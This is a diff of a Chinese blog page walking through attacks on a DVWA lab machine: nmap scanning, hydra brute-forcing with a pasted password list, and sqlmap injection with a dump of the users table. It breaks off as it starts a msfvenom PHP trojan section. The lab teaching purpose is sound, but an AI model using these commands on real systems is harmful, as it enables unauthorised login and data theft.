@@ -52,7 +52,6 @@ if (!doNotTrack) {
 
 
 <link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
-<script src="/vendor/js/vue.min.js" ></script>
 
 
   
@@ -68,10 +67,10 @@ if (!doNotTrack) {
 
 
 
-<link rel="stylesheet" href="https://weepingdogel.github.io/scss/dark-mode.min.c0082f0b082177f6fb3768ff91439a097de49689bd26f4d49f76d94ebb81e02d.css" integrity="sha256-wAgvCwghd/b7N2j/kUOaCX3klom9JvTUn3bZTruB4C0=" media="screen">
+<link rel="stylesheet" href="https://weepingdogel.github.io/scss/dark-mode.min.f7c2efa7183435a6bd1842f91c541481c7a5137b5991629a870f24e4a516ad4b.css" integrity="sha256-98Lvpxg0Naa9GEL5HFQUgcelE3tZkWKahw8k5KUWrUs=" media="screen">
 
 
-<script src="/js/loadCSS.js"></script>
+<script src="/vendor/js/loadCSS.js"></script>
 <script>
   loadCSS("https://fonts.googleapis.com/css?family=Fira+Mono|Material+Icons");
 </script>
@@ -79,9 +78,9 @@ if (!doNotTrack) {
 
 
 
-  
-    <script src="/js/toc.js"></script>
-  
+
+
+  <script src="/js/toc.js"></script>
 
 
 
@@ -114,11 +113,9 @@ if (!doNotTrack) {
 
 
 
-
-
 </head>
 <body>
-    	<div id="app"><div ref="sideContainer" class="side-container">
+    	<div id="app"><div id="sideContainer" class="side-container">
     
     <a class="a-block nav-head false" href="https://weepingdogel.github.io/">
     
@@ -215,7 +212,7 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 
     </div>
     
-</div><div ref="extraContainer" class="extra-container">
+</div><div id="extraContainer" class="extra-container">
     
     
     <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">
@@ -623,19 +620,16 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
             </i>
         </a>
         
-        <a class="pagination-action" v-on:click="toggleDarkMode">
-            <i class="material-icons pagination-action-icon" v-if="isDarkMode">
-                brightness_4
-            </i>
-            <i class="material-icons pagination-action-icon" v-else="isDarkMode">
-                brightness_7
-            </i>
+        <a type="button" class="pagination-action" id="darkModeToggleButton">
+            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
+                dark_mode
+            </span>
         </a>
         
         
     </div>
 </div>
-<div class="single-column-drawer-container" ref="drawer"
+<div class="single-column-drawer-container" id="drawer"
      v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
     <div class="drawer-content">
         <div class="drawer-menu">
@@ -1107,32 +1101,29 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
     </div>
 </div>
 <transition name="fade">
-    <div v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
+    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
 </transition>
-<nav ref="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
-    <div ref="navBackground" class="nav-background"></div>
+<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
+    <div id="navBackground" class="nav-background"></div>
     <div class="container container-narrow nav-content">
         <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
             <i class="material-icons">
                 menu
             </i>
         </button>
-        <a ref="navTitle" class="navbar-brand" href="https://weepingdogel.github.io/">
+        <a id="navTitle" class="navbar-brand" href="https://weepingdogel.github.io/">
             WeepingDogel&#39;s Blog
         </a>
         
-        <button type="button" class="nav-darkmode-toggle" v-on:click="toggleDarkMode">
-            <i class="material-icons" v-if="isDarkMode">
-                brightness_4
-            </i>
-            <i class="material-icons" v-else="isDarkMode">
-                brightness_7
+        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
+            <i class="material-icons" id="darkModeToggleIcon2">
+                dark_mode
             </i>
         </button>
         
     </div>
 </nav>
-<div class="single-column-header-container" ref="pageHead"
+<div class="single-column-header-container" id="pageHead"
      v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
     <a href="https://weepingdogel.github.io/">
         <div class="single-column-header-title">WeepingDogel&#39;s Blog</div>
@@ -1144,7 +1135,8 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 </div>
 
             <div id="content">
-<div ref="streamContainer" class="stream-container">
+                <div id="streamContainer" class="stream-container">
+
     <div class="post-list-container post-list-container-shadow">
         <div class="post">
             
@@ -1314,22 +1306,22 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 <p>我们刚刚搭建完靶机却不知道它的<strong>IP地址</strong>，这意味着我们不知道<strong>它的位置</strong>，那么怎么办呢？这个时候我们要用到<strong>nmap</strong>把他扫出来。</p>
 <p>不过前提是首先你得知道你所处的IP段，我的环境是局域网，DHCP地址段是<code>192.168.0.1/24</code></p>
 <p>执行</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap -v -O 192.168.0.1/24
-!<span style="color:#666">[](</span>/img/截图_2019-10-20_06-27-08.png<span style="color:#666">)</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ sudo nmap -v -O 192.168.0.1/24
+!<span style="color:#ff79c6">[](</span>/img/截图_2019-10-20_06-27-08.png<span style="color:#ff79c6">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>可以发现它很快就扫出来了</p>
 <p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-31-32.png" alt=""></p>
 <p>终端里获取到的信息如下，说明这个192.168.0.107就是靶机的地址</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
@@ -1367,7 +1359,7 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Nmap scan report for 192.168.0.107
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-txt" data-lang="txt">Nmap scan report for 192.168.0.107
 Host is up (0.00028s latency).
 Not shown: 977 closed ports
 PORT     STATE SERVICE
@@ -1441,9 +1433,9 @@ IP ID Sequence Generation: All zeros
 <p>然后点击<strong>login</strong>。</p>
 <p>接下来我们就抓取到了这个数据包了，下面还有我输入过的信息</p>
 <p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-13-04.png" alt=""></p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
@@ -1459,30 +1451,30 @@ IP ID Sequence Generation: All zeros
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#06287e">POST</span> <span style="color:#0e84b5;font-weight:bold">/dvwa/login.php</span> <span style="color:#007020;font-weight:bold">HTTP</span><span style="color:#666">/</span><span style="color:#40a070">1.1</span>
-Host<span style="color:#666">:</span> 192.168.0.4
-User-Agent<span style="color:#666">:</span> Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0
-Accept<span style="color:#666">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language<span style="color:#666">:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding<span style="color:#666">:</span> gzip, deflate
-Content-Type<span style="color:#666">:</span> application/x-www-form-urlencoded
-Content-Length<span style="color:#666">:</span> 46
-Connection<span style="color:#666">:</span> close
-Referer<span style="color:#666">:</span> http://192.168.0.4/dvwa/login.php
-Cookie<span style="color:#666">:</span> security=high; PHPSESSID=091eeaf25f53c1c6c6dd230cd5add7be
-Upgrade-Insecure-Requests<span style="color:#666">:</span> 1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-http" data-lang="http"><span style="color:#50fa7b">POST</span> /dvwa/login.php <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
+Host<span style="color:#ff79c6">:</span> 192.168.0.4
+User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0
+Accept<span style="color:#ff79c6">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language<span style="color:#ff79c6">:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
+Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
+Content-Length<span style="color:#ff79c6">:</span> 46
+Connection<span style="color:#ff79c6">:</span> close
+Referer<span style="color:#ff79c6">:</span> http://192.168.0.4/dvwa/login.php
+Cookie<span style="color:#ff79c6">:</span> security=high; PHPSESSID=091eeaf25f53c1c6c6dd230cd5add7be
+Upgrade-Insecure-Requests<span style="color:#ff79c6">:</span> 1
 
 username=admin&amp;password=6666666666&amp;Login=Login
 </code></pre></td></tr></table>
 </div>
 </div><p>嘛…这么一大堆看着都头晕</p>
 <p>诶嘿，其实这里你只需要保存这一部分就可以了</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">username=admin&amp;password=6666666666&amp;Login=Login
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-txt" data-lang="txt">username=admin&amp;password=6666666666&amp;Login=Login
 </code></pre></td></tr></table>
 </div>
 </div><p>嘛，上面这点还不够呢，还需要获取一段信息。</p>
@@ -1496,12 +1488,12 @@ username=admin&amp;password=6666666666&amp;Login=Login
 <p>这时，网页下面弹出了一段字符串</p>
 <p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-26-23.png" alt=""></p>
 <p>码下来，一会儿要用到的</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Login failed
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-txt" data-lang="txt">Login failed
 </code></pre></td></tr></table>
 </div>
 </div><p>接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。</p>
@@ -1518,9 +1510,9 @@ username=admin&amp;password=6666666666&amp;Login=Login
 <li>IP地址 : 也就是目标的地址咯，上面的<code>192.168.0.4</code></li>
 <li>http-post-form : 指定爆破类型，后面还要加爆破的页面地址，这里是http的post页面 没有密码字典？我这里提供一个，你自己复制进一个txt文件里就可以了。</li>
 </ul>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
@@ -1894,7 +1886,7 @@ username=admin&amp;password=6666666666&amp;Login=Login
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">372
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">123456
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-txt" data-lang="txt">123456
 12345
 123456789
 Password
@@ -2269,21 +2261,21 @@ gedingfeng1102888
 </code></pre></td></tr></table>
 </div>
 </div><p>以及你需要把上面抓到的<code>username=admin&amp;password=6666666666&amp;Login=Login</code>和<code>Login failed</code>整合一下变成这样:</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-txt" data-lang="txt">username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed
 </code></pre></td></tr></table>
 </div>
 </div><p>整合一下，需要执行的指令就是下面这个了</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hydra -l admin -P ./密码字典/pass-wake.txt -V -e ns 192.168.0.4 http-post-form <span style="color:#4070a0">&#34;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&#34;</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ hydra -l admin -P ./密码字典/pass-wake.txt -V -e ns 192.168.0.4 http-post-form <span style="color:#f1fa8c">&#34;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&#34;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>它很快就会给你破解出来</p>
@@ -2310,12 +2302,12 @@ gedingfeng1102888
 <h4 id="使用sqlmap注入">使用sqlmap注入</h4>
 <p>接下来用到的工具就是sqlmap了，这里只写出注入的流程，具体的教程请参考由帝的视频</p>
 <p>我们先扫描一下注入点</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sqlmap -r <span style="color:#4070a0">&#34;get.txt&#34;</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ sqlmap -r <span style="color:#f1fa8c">&#34;get.txt&#34;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-17-27.png" alt=""></p>
@@ -2325,9 +2317,9 @@ gedingfeng1102888
 <p>最后一个选项选<code>n</code>不必浪费时间了。</p>
 <p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-19-51.png" alt=""></p>
 <p>接下来我们就获得我们需要的信息了，数据库版本什么的。我把它贴出来吧。</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
@@ -2351,7 +2343,7 @@ gedingfeng1102888
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-txt" data-lang="txt">sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
 ---
 Parameter: id (GET)
     Type: boolean-based blind
@@ -2376,20 +2368,20 @@ back-end DBMS: MySQL &gt;= 4.1
 </code></pre></td></tr></table>
 </div>
 </div><p>接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sqlmap -r <span style="color:#4070a0">&#34;~/get.txt&#34;</span> --dump
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ sqlmap -r <span style="color:#f1fa8c">&#34;~/get.txt&#34;</span> --dump
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-26-48.png" alt=""></p>
 <p>出来了。</p>
 <p>如果你终端里获取到了以下信息，那么说明，第二关通过了</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
@@ -2403,7 +2395,7 @@ back-end DBMS: MySQL &gt;= 4.1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Database: dvwa
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-txt" data-lang="txt">Database: dvwa
 Table: users
 [5 entries]
 +---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
@@ -2424,29 +2416,29 @@ Table: users
 <p>这次也将使用PHP文件作为<strong>木马</strong>进行攻击。</p>
 <h4 id="生成木马">生成木马</h4>
 <p>我们用 <strong><code>msfvenom</code></strong> 这个命令来生成。执行</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
